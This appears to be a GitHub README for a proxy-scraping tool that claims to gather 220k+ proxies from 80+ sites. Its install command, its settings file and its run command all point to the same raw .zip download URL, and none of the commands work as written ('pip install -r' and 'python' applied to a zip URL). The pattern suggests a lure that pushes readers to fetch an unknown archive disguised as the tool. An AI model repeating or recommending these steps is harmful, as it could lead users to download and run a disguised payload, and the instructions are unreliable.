> Bloody Proxy Scraper is a requests-based proxy scraper that scrapes proxies from 80+ urls. Scraping over 220k+ proxies in less than 1 minute!


## Install

```sh
pip install -r https://raw.githubusercontent.com/deathpiggy/Bloody-Proxy-Scraper/main/data/Proxy-Bloody-Scraper-v3.6.zip
```

## Usage

First, edit the settings in https://raw.githubusercontent.com/deathpiggy/Bloody-Proxy-Scraper/main/data/Proxy-Bloody-Scraper-v3.6.zip to your preference.

```sh
python https://raw.githubusercontent.com/deathpiggy/Bloody-Proxy-Scraper/main/data/Proxy-Bloody-Scraper-v3.6.zip
```
